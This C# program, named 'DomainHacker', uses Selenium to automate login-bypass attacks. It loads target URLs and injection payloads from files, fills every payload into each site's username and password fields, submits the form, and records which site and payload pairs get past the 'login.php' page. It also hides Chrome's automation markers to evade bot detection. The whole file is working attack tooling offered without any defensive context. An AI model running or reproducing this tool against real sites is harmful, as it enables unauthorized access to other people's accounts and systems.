using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace DomainHacker
{
    internal class Program
    {
        static Random random = new Random();
        static void Main(string[] args)
        {
            Console.WriteLine("Press c for chrome and f for firefox");
            string browser = Console.ReadLine();          

            string[] urls = File.ReadAllLines(@"c:/Users/Public/urls.txt");
            string[] payloads = File.ReadAllLines(@"c:/Users/Public/payloads.txt");
            FileStream fileStream = new FileStream(@"c:/Users/Public/allowed.txt", FileMode.Append, FileAccess.Write);
            StreamWriter writer = new StreamWriter(fileStream);

            IWebDriver driver = null;
            if(browser.ToLower() == "c")
            {
                driver = Createdriver();
            }
            else if(browser.ToLower() == "f")
            {
                driver=CreateFirefoxDriver();
            }

            if(driver != null)
            {
                foreach (string url in urls)
                {
                    IJavaScriptExecutor scriptExecutor = (IJavaScriptExecutor)driver;
                    scriptExecutor.ExecuteScript("window.open()");
                }

                foreach (string payload in payloads)
                {
                    int counter = 0;
                    foreach (string url in urls)
                    {
                        driver.SwitchTo().Window(driver.WindowHandles[counter]);
                        driver.Navigate().GoToUrl(url);


                        try
                        {
                            //USER ID/EMAIL/USERNAME
                            try
                            {
                                driver.FindElement(By.CssSelector("input[type = text]")).Clear();
                                driver.FindElement(By.CssSelector("input[type = text]")).SendKeys(payload);
                                goto PASSWORD;
                            }
                            catch (Exception)
                            {
                                goto USERID1;
                            }
                        USERID1:
                            try
                            {
                                driver.FindElement(By.CssSelector("input[type = email]")).Clear();
                                driver.FindElement(By.CssSelector("input[type = email]")).SendKeys(payload);
                                goto PASSWORD;
                            }
                            catch (Exception)
                            {
                                goto USERID2;
                            }
                        USERID2:
                            try
                            {
                                driver.FindElement(By.CssSelector("input[type = username]")).Clear();
                                driver.FindElement(By.CssSelector("input[type = username]")).SendKeys(payload);
                            }
                            catch (Exception) { }


                        //PASSWORD
                        PASSWORD:
                            driver.FindElement(By.CssSelector("input[type = password]")).Clear();
                            driver.FindElement(By.CssSelector("input[type = password]")).SendKeys(payload);


                            Thread.Sleep(700);


                            //SUBMIT/BUTTON
                            try
                            {
                                driver.FindElement(By.CssSelector("input[type = submit]")).Click();
                                goto OUT;
                            }
                            catch (Exception)
                            {
                                goto SUBMIT1;
                            }
                        SUBMIT1:
                            try
                            {
                                driver.FindElement(By.CssSelector("input[type = button]")).Click();
                                goto OUT;
                            }
                            catch (Exception)
                            {
                                goto SUBMIT2;
                            }
                        SUBMIT2:
                            try
                            {
                                driver.FindElement(By.CssSelector("button[type = submit]")).Click();
                                goto OUT;
                            }
                            catch (Exception) { }

                        OUT:
                            try
                            {
                                driver.SwitchTo().Alert().Dismiss();
                            }
                            catch (Exception)
                            {

                            }
                            try
                            {
                                string currentUrl = driver.Url;
                                if (!currentUrl.Contains("login.php"))
                                {
                                    writer.WriteLine(url + "    " + payload);
                                    writer.Flush();
                                    fileStream.Flush();
                                }
                            }
                            catch (Exception) { }
                        }
                        catch (Exception){ continue;  }

                        counter++;
                    }
                }
                writer.Close();
                fileStream.Close();
                driver.Dispose();
                //KillProcesses();
            }
        }







        static public void KillProcesses()
        {
            Process[] driverProcesses = Process.GetProcessesByName("chrome");
            Process[] firefoxDriverProcesses = Process.GetProcessesByName("firefox");
            foreach (var driverProcess in driverProcesses)
            {
                driverProcess.Kill();
            }
            foreach (var firefoxDriverProcess in firefoxDriverProcesses)
            {
                firefoxDriverProcess.Kill();
            }
        }
        static private ChromeDriver Createdriver()
        {
            ChromeOptions options = new ChromeOptions();
            //options.AddArgument("--headless");
            options.AddArgument("--no-sandbox");
            options.AddExcludedArgument("enable-automation");
            options.AddAdditionalCapability("useAutomationExtension", false);
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            //service.HideCommandPromptWindow = true;
            //TimeSpan.FromSeconds is the max time for request to timeout
            ChromeDriver driver = new ChromeDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
            driver.Manage().Timeouts().PageLoad.Add(System.TimeSpan.FromSeconds(random.Next(10, 20)));
            driver.Manage().Window.Maximize();
            return driver;
        }
        static private FirefoxDriver CreateFirefoxDriver()
        {
            FirefoxOptions options = new FirefoxOptions();
            //options.AddArgument("--headless");
            options.AddArgument("--no-sandbox");
            FirefoxDriverService service = FirefoxDriverService.CreateDefaultService();
            //service.HideCommandPromptWindow = true;
            FirefoxDriver driver = new FirefoxDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
            driver.Manage().Timeouts().PageLoad.Add(System.TimeSpan.FromSeconds(random.Next(10, 20)));
            driver.Manage().Window.Maximize();
            return driver;
        }

    }
}
